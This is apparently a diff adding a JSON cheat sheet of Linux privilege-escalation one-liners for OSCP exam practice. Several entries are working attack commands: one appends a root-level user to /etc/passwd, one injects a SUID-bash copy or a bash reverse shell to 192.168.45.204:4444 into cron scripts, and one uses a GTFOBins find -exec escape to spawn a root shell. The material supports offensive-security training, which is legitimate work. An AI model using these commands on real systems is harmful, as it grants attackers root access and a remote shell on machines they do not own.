@@ -1,0 +1,114 @@
+{
+  "cheatsheets": [
+    {
+      "id": "linux-privesc-oneliners",
+      "name": "Linux Privilege Escalation One-Liners",
+      "description": "Essential Linux privesc one-liners for rapid OSCP enumeration and exploitation. All commands use standard Linux utilities - no tool uploads required.",
+      "category": "one-liners",
+      "oscp_relevance": "high",
+      "educational_header": {
+        "how_to_recognize": [
+          "You have a low-privilege shell on a Linux target",
+          "Need to escalate to root quickly using manual techniques",
+          "Restricted environment where uploading linpeas/linenum is impractical",
+          "Time-sensitive situation requiring immediate enumeration"
+        ],
+        "when_to_look_for": [
+          "Immediately after obtaining initial shell access",
+          "When automated enumeration scripts are blocked or unavailable",
+          "During OSCP exam when every second counts",
+          "When pivoting through multiple Linux systems rapidly"
+        ]
+      },
+      "scenarios": [
+        {
+          "title": "Scenario: Linux Privilege Escalation from Low-Priv Shell",
+          "context": "You have obtained a low-privilege shell on a Linux target (web shell, reverse shell, SSH as low-priv user). Need to escalate to root quickly using manual techniques suitable for OSCP exam.",
+          "approach": "Phase 1: Quick Enumeration (30 seconds)\n- Run linux-quick-privesc-enum to check SUID, SGID, capabilities\n- Note any non-standard binaries or dangerous capabilities\n\nPhase 2: Check Quick Wins (30 seconds)\n- Test writable /etc/passwd: [ -w /etc/passwd ] && echo 'VULNERABLE'\n- If vulnerable, use linux-passwd-privesc for instant root\n- Check sudo -l for NOPASSWD entries\n\nPhase 3: SUID Exploitation (1-2 minutes)\n- Use linux-gtfobins-suid-filter to identify exploitable binaries\n- Cross-reference with GTFOBins website\n- Execute exploitation technique (e.g., find -exec /bin/bash -p)\n\nPhase 4: Cron/Scheduled Tasks (1 minute)\n- Use linux-cron-enum to view scheduled jobs\n- Look for writable scripts or PATH hijacking opportunities\n\nPhase 5: Flag Capture\n- Use linux-flag-finder to locate proof.txt\n- Screenshot id output with flag content",
+          "commands": [
+            "linux-quick-privesc-enum",
+            "linux-passwd-privesc",
+            "linux-gtfobins-suid-filter",
+            "linux-cron-enum",
+            "linux-flag-finder"
+          ],
+          "expected_outcome": "Root access within 5 minutes using manual techniques. Methodology follows standard OSCP privesc workflow with documented evidence for reporting.",
+          "why_this_works": "Systematic approach covers most common Linux privesc vectors in order of reliability and speed. SUID and writable passwd are the most reliable quick wins, followed by sudo misconfigurations and cron job exploitation."
+        }
+      ],
+      "sections": [
+        {
+          "title": "Linux Privilege Escalation - One-Liners",
+          "notes": "Essential Linux privesc one-liners for rapid OSCP enumeration and exploitation.\n\nEXECUTION ORDER (recommended):\n1. Quick enum (SUID/SGID/capabilities) - First thing after shell\n2. Check writable /etc/passwd - Instant win if vulnerable\n3. Filter for GTFOBins exploitable binaries - Focus research\n4. Enumerate cron jobs - Look for writable scripts\n5. Research remaining SUID with searchsploit\n\nOSCP EXAM RELEVANCE: HIGH\n- All techniques are manual and exam-allowed\n- No tools required beyond standard Linux utilities\n- Quick execution (most under 30 seconds)\n\nCOMMON QUICK WINS:\n- Writable /etc/passwd: Add root user instantly\n- SUID find/vim/python: GTFOBins exploitation\n- Writable cron script: Inject reverse shell\n- Dangerous capabilities: cap_setuid on any interpreter",
+          "commands": [
+            {
+              "id": "linux-flag-finder",
+              "example": "result=$(find / -type f -regex \".*\\(flag\\|proof\\)\\.txt\" 2>/dev/null); [ -n \"$result\" ] && echo \"$result\" || grep -rlE \"OS\\{[a-fA-F0-9]{32}\\}\" / 2>/dev/null",
+              "shows": "Path to flag.txt or proof.txt displayed"
+            },
+            {
+              "id": "linux-passwd-privesc",
+              "example": "U=\"root2\" P=\"w00t\"; [ -w /etc/passwd ] && ! grep -q \"^$U:\" /etc/passwd && echo \"$U:$(openssl passwd $P):0:0:root:/root:/bin/bash\" >> /etc/passwd && su $U",
+              "shows": "No error from echo command"
+            },
+            {
+              "id": "linux-quick-privesc-enum",
+              "example": "echo \"=== SUID ===\" && find / -perm -4000 -type f 2>/dev/null && echo -e \"\\n=== SGID ===\" && find / -perm -2000 -type f 2>/dev/null && echo -e \"\\n=== CAPABILITIES ===\" && getcap -r / 2>/dev/null",
+              "shows": "List of SUID binaries displayed"
+            },
+            {
+              "id": "linux-full-privesc-check",
+              "example": "echo \"[*] SUID binaries owned by root:\" && find / -perm -4000 -user root -type f 2>/dev/null && echo -e \"\\n[*] Capabilities:\" && getcap -r / 2>/dev/null && echo -e \"\\n[*] Writable /etc/passwd?\" && [ -w /etc/passwd ] && echo \"YES - VULNERABLE\" || echo \"No\" && echo -e \"\\n[*] Sudo permissions:\" && sudo -l 2>/dev/null",
+              "shows": "Complete output for all sections"
+            },
+            {
+              "id": "linux-gtfobins-suid-filter",
+              "example": "GTFO=\"find|vim|nmap|python|perl|ruby|bash|less|more|cp|mv|tar|awk|env|ftp|git|docker|php|node|lua\"; find / -perm -4000 -type f 2>/dev/null | grep -E \"($GTFO)\"",
+              "shows": "One or more known exploitable binaries found"
+            },
+            {
+              "id": "linux-suid-auto-research",
+              "example": "for bin in $(find / -perm -4000 -type f 2>/dev/null | xargs -I {} basename {}); do echo \"=== $bin ===\"; searchsploit $bin 2>/dev/null | head -5; done",
+              "shows": "Exploit entries found for binaries"
+            },
+            {
+              "id": "linux-cron-enum",
+              "example": "cat /etc/crontab; ls -la /etc/cron.*; cat /var/spool/cron/crontabs/* 2>/dev/null",
+              "shows": "Crontab contents displayed"
+            },
+            {
+              "id": "linux-suid-vuln-check",
+              "example": "ls -la $(which find) | grep -q 'rws' && echo \"VULNERABLE\" || echo \"NOT VULNERABLE\"",
+              "shows": "VULNERABLE output"
+            },
+            {
+              "id": "linux-cron-hijack-suid",
+              "example": "echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /var/archives/archive.sh && sleep 65 && /tmp/rootbash -p",
+              "shows": "No error from echo command"
+            },
+            {
+              "id": "linux-cron-hijack-revshell",
+              "example": "echo 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' >> /opt/scripts/backup.sh",
+              "shows": "Reverse shell connects as root"
+            },
+            {
+              "id": "linux-suid-find-shell",
+              "example": "find / -exec /bin/bash -p \\; -quit",
+              "shows": "Shell prompt changes to # or bash-5.0#"
+            }
+          ]
+        }
+      ],
+      "tags": [
+        "ONE_LINER",
+        "OSCP:HIGH",
+        "LINUX",
+        "PRIVILEGE_ESCALATION",
+        "SUID",
+        "CRON",
+        "GTFOBINS",
+        "QUICK_REFERENCE"
+      ]
+    }
+  ]
+}
